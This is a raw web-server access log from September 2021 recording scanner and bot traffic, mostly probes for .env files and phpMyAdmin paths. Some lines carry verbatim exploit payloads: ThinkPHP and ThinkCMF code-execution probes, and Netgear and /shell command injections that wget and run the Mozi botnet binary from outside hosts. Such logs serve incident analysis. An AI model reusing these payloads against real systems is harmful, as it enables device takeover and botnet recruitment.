45.146.164.110 - - [14/Sep/2021:12:58:51 +0000] "GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.164.110 - - [14/Sep/2021:12:58:51 +0000] "GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.164.110 - - [14/Sep/2021:12:58:51 +0000] "GET /_ignition/execute-solution HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.164.110 - - [14/Sep/2021:12:58:51 +0000] "GET /_ignition/execute-solution HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.164.110 - - [14/Sep/2021:12:58:52 +0000] "GET /index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.164.110 - - [14/Sep/2021:12:58:52 +0000] "GET /index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.164.110 - - [14/Sep/2021:12:58:53 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.164.110 - - [14/Sep/2021:12:58:53 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
54.186.122.127 - - [14/Sep/2021:13:38:55 +0000] "GET /.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.186.122.127 - - [14/Sep/2021:13:38:55 +0000] "GET /.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.186.122.127 - - [14/Sep/2021:13:38:55 +0000] "POST / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.186.122.127 - - [14/Sep/2021:13:38:55 +0000] "POST / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
35.247.159.216 - - [14/Sep/2021:13:39:14 +0000] "GET / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
35.247.159.216 - - [14/Sep/2021:13:39:14 +0000] "GET / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
35.247.159.216 - - [14/Sep/2021:13:39:14 +0000] "GET / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
35.247.159.216 - - [14/Sep/2021:13:39:14 +0000] "GET / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
168.90.143.139 - - [14/Sep/2021:14:12:07 +0000] "GET / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
168.90.143.139 - - [14/Sep/2021:14:12:07 +0000] "GET / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
143.244.169.254 - - [14/Sep/2021:14:29:25 +0000] "GET /.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
143.244.169.254 - - [14/Sep/2021:14:29:25 +0000] "GET /.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
143.244.169.254 - - [14/Sep/2021:14:29:25 +0000] "POST / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
143.244.169.254 - - [14/Sep/2021:14:29:25 +0000] "POST / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
103.123.43.189 - - [14/Sep/2021:14:55:45 +0000] "GET / HTTP/1.0" 301 178 "-" "-"
103.123.43.189 - - [14/Sep/2021:14:55:45 +0000] "GET / HTTP/1.0" 301 178 "-" "-"
209.141.32.221 - - [14/Sep/2021:15:56:53 +0000] "GET / HTTP/1.1" 301 178 "http://35.180.74.184:80/left.html" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0"
209.141.32.221 - - [14/Sep/2021:15:56:53 +0000] "GET / HTTP/1.1" 301 178 "http://35.180.74.184:80/left.html" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0"
178.251.110.102 - - [14/Sep/2021:16:08:27 +0000] "GET / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
178.251.110.102 - - [14/Sep/2021:16:08:27 +0000] "GET / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
1.15.150.193 - - [14/Sep/2021:16:24:19 +0000] "GET / HTTP/1.1" 301 178 "-" "Mozilla/5.0 zgrab/0.x"
1.15.150.193 - - [14/Sep/2021:16:24:19 +0000] "GET / HTTP/1.1" 301 178 "-" "Mozilla/5.0 zgrab/0.x"
27.45.11.146 - - [14/Sep/2021:16:25:30 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://27.45.11.146:50803/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 301 178 "-" "-"
27.45.11.146 - - [14/Sep/2021:16:25:30 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://27.45.11.146:50803/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 301 178 "-" "-"
107.189.14.98 - - [14/Sep/2021:17:13:06 +0000] "GET / HTTP/1.1" 301 178 "-" "Linux Gnu (cow)"
107.189.14.98 - - [14/Sep/2021:17:13:06 +0000] "GET / HTTP/1.1" 301 178 "-" "Linux Gnu (cow)"
49.83.196.210 - - [14/Sep/2021:17:29:45 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 301 178 "-" "-"
49.83.196.210 - - [14/Sep/2021:17:29:45 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 301 178 "-" "-"
107.189.31.252 - - [14/Sep/2021:18:16:11 +0000] "GET /config/getuser?index=0 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
107.189.31.252 - - [14/Sep/2021:18:16:11 +0000] "GET /config/getuser?index=0 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
103.156.90.219 - - [14/Sep/2021:18:21:11 +0000] "GET /.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
103.156.90.219 - - [14/Sep/2021:18:21:11 +0000] "GET /.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
103.156.90.219 - - [14/Sep/2021:18:21:12 +0000] "POST / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
103.156.90.219 - - [14/Sep/2021:18:21:12 +0000] "POST / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
107.189.14.98 - - [14/Sep/2021:18:52:28 +0000] "GET / HTTP/1.1" 301 178 "-" "Linux Gnu (cow)"
107.189.14.98 - - [14/Sep/2021:18:52:28 +0000] "GET / HTTP/1.1" 301 178 "-" "Linux Gnu (cow)"
202.83.56.144 - - [14/Sep/2021:19:06:44 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://202.83.56.144:40406/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 301 178 "-" "Hello, world"
202.83.56.144 - - [14/Sep/2021:19:06:44 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://202.83.56.144:40406/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 301 178 "-" "Hello, world"
88.225.235.204 - - [14/Sep/2021:19:10:55 +0000] "GET / HTTP/1.0" 301 178 "-" "-"
88.225.235.204 - - [14/Sep/2021:19:10:55 +0000] "GET / HTTP/1.0" 301 178 "-" "-"
167.248.133.116 - - [14/Sep/2021:19:14:08 +0000] "GET / HTTP/1.1" 301 178 "-" "-"
167.248.133.116 - - [14/Sep/2021:19:14:08 +0000] "GET / HTTP/1.1" 301 178 "-" "-"
167.248.133.116 - - [14/Sep/2021:19:14:08 +0000] "GET / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.248.133.116 - - [14/Sep/2021:19:14:08 +0000] "GET / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
18.132.46.167 - - [14/Sep/2021:00:11:55 +0000] "GET / HTTP/1.1" 301 178 "-" "'Cloud mapping experiment. Contact research@pdrlabs.net'"
18.132.46.167 - - [14/Sep/2021:00:11:55 +0000] "GET / HTTP/1.1" 301 178 "-" "'Cloud mapping experiment. Contact research@pdrlabs.net'"
46.147.176.25 - - [14/Sep/2021:00:48:47 +0000] "GET / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
46.147.176.25 - - [14/Sep/2021:00:48:47 +0000] "GET / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
51.138.221.102 - - [14/Sep/2021:01:05:50 +0000] "GET /.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.138.221.102 - - [14/Sep/2021:01:05:50 +0000] "GET /.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.138.221.102 - - [14/Sep/2021:01:05:50 +0000] "POST / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.138.221.102 - - [14/Sep/2021:01:05:50 +0000] "POST / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
190.213.155.143 - - [14/Sep/2021:01:08:28 +0000] "GET /.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
190.213.155.143 - - [14/Sep/2021:01:08:28 +0000] "GET /.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
190.213.155.143 - - [14/Sep/2021:01:08:29 +0000] "POST / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
190.213.155.143 - - [14/Sep/2021:01:08:29 +0000] "POST / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [14/Sep/2021:01:18:25 +0000] "POST / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [14/Sep/2021:01:18:25 +0000] "POST / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [14/Sep/2021:01:18:25 +0000] "GET /.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [14/Sep/2021:01:18:25 +0000] "GET /.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
84.144.102.198 - - [14/Sep/2021:01:23:49 +0000] "GET /phpmyadmin2018/index.php?lang=en HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
84.144.102.198 - - [14/Sep/2021:01:23:49 +0000] "GET /phpmyadmin2018/index.php?lang=en HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
84.144.102.198 - - [14/Sep/2021:01:23:49 +0000] "GET /PMA2017/index.php?lang=en HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
84.144.102.198 - - [14/Sep/2021:01:23:49 +0000] "GET /PMA2017/index.php?lang=en HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
84.144.102.198 - - [14/Sep/2021:01:23:49 +0000] "GET /PMA2011/index.php?lang=en HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
84.144.102.198 - - [14/Sep/2021:01:23:49 +0000] "GET /PMA2011/index.php?lang=en HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
84.144.102.198 - - [14/Sep/2021:01:23:49 +0000] "GET /administrator/phpmyadmin/index.php?lang=en HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
84.144.102.198 - - [14/Sep/2021:01:23:49 +0000] "GET /administrator/phpmyadmin/index.php?lang=en HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
84.144.102.198 - - [14/Sep/2021:01:23:49 +0000] "GET /admin/pMA/index.php?lang=en HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
84.144.102.198 - - [14/Sep/2021:01:23:49 +0000] "GET /admin/pMA/index.php?lang=en HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
84.144.102.198 - - [14/Sep/2021:01:23:49 +0000] "GET /admin/web/index.php?lang=en HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
84.144.102.198 - - [14/Sep/2021:01:23:49 +0000] "GET /admin/web/index.php?lang=en HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
84.144.102.198 - - [14/Sep/2021:01:23:50 +0000] "GET /db/phpmyadmin/index.php?lang=en HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
84.144.102.198 - - [14/Sep/2021:01:23:50 +0000] "GET /db/phpmyadmin/index.php?lang=en HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
84.144.102.198 - - [14/Sep/2021:01:23:50 +0000] "GET /sql/phpmanager/index.php?lang=en HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
84.144.102.198 - - [14/Sep/2021:01:23:50 +0000] "GET /sql/phpmanager/index.php?lang=en HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
84.144.102.198 - - [14/Sep/2021:01:23:51 +0000] "GET /PMA2017/index.php?lang=en HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
84.144.102.198 - - [14/Sep/2021:01:23:51 +0000] "GET /PMA2017/index.php?lang=en HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
84.144.102.198 - - [14/Sep/2021:01:23:51 +0000] "GET /sql/sqladmin/index.php?lang=en HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
84.144.102.198 - - [14/Sep/2021:01:23:51 +0000] "GET /sql/sqladmin/index.php?lang=en HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
84.144.102.198 - - [14/Sep/2021:01:23:51 +0000] "GET /sql/websql/index.php?lang=en HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
84.144.102.198 - - [14/Sep/2021:01:23:51 +0000] "GET /sql/websql/index.php?lang=en HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
84.144.102.198 - - [14/Sep/2021:01:23:51 +0000] "GET /PMA2015/index.php?lang=en HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
84.144.102.198 - - [14/Sep/2021:01:23:51 +0000] "GET /PMA2015/index.php?lang=en HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
84.144.102.198 - - [14/Sep/2021:01:23:51 +0000] "GET /sql/phpmyadmin2/index.php?lang=en HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
84.144.102.198 - - [14/Sep/2021:01:23:51 +0000] "GET /sql/phpmyadmin2/index.php?lang=en HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
162.142.125.193 - - [14/Sep/2021:01:29:52 +0000] "GET / HTTP/1.1" 301 178 "-" "-"
162.142.125.193 - - [14/Sep/2021:01:29:52 +0000] "GET / HTTP/1.1" 301 178 "-" "-"
162.142.125.193 - - [14/Sep/2021:01:29:52 +0000] "GET / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.193 - - [14/Sep/2021:01:29:52 +0000] "GET / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
209.17.96.90 - - [14/Sep/2021:02:23:21 +0000] "GET / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
209.17.96.90 - - [14/Sep/2021:02:23:21 +0000] "GET / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
159.65.88.210 - - [14/Sep/2021:02:25:36 +0000] "GET /.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
159.65.88.210 - - [14/Sep/2021:02:25:36 +0000] "GET /.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
159.65.88.210 - - [14/Sep/2021:02:25:36 +0000] "POST / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
159.65.88.210 - - [14/Sep/2021:02:25:36 +0000] "POST / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
46.101.82.40 - - [14/Sep/2021:02:29:20 +0000] "GET /.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
46.101.82.40 - - [14/Sep/2021:02:29:20 +0000] "GET /.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
46.101.82.40 - - [14/Sep/2021:02:29:21 +0000] "POST / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
46.101.82.40 - - [14/Sep/2021:02:29:21 +0000] "POST / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
139.162.145.250 - - [14/Sep/2021:03:37:44 +0000] "GET /bag2 HTTP/1.1" 301 178 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)"
139.162.145.250 - - [14/Sep/2021:03:37:44 +0000] "GET /bag2 HTTP/1.1" 301 178 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)"
209.141.32.221 - - [14/Sep/2021:03:48:00 +0000] "GET / HTTP/1.1" 301 178 "http://35.180.74.184:80/left.html" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0"
209.141.32.221 - - [14/Sep/2021:03:48:00 +0000] "GET / HTTP/1.1" 301 178 "http://35.180.74.184:80/left.html" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0"
135.125.246.110 - - [14/Sep/2021:04:19:48 +0000] "POST / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [14/Sep/2021:04:19:48 +0000] "POST / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [14/Sep/2021:04:19:48 +0000] "GET /.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [14/Sep/2021:04:19:48 +0000] "GET /.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
212.154.7.246 - - [14/Sep/2021:04:42:15 +0000] "GET /.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
212.154.7.246 - - [14/Sep/2021:04:42:15 +0000] "GET /.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
212.154.7.246 - - [14/Sep/2021:04:42:15 +0000] "POST / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
212.154.7.246 - - [14/Sep/2021:04:42:15 +0000] "POST / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
103.156.90.219 - - [14/Sep/2021:04:48:26 +0000] "GET /.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
103.156.90.219 - - [14/Sep/2021:04:48:26 +0000] "GET /.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
103.156.90.219 - - [14/Sep/2021:04:48:28 +0000] "POST / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
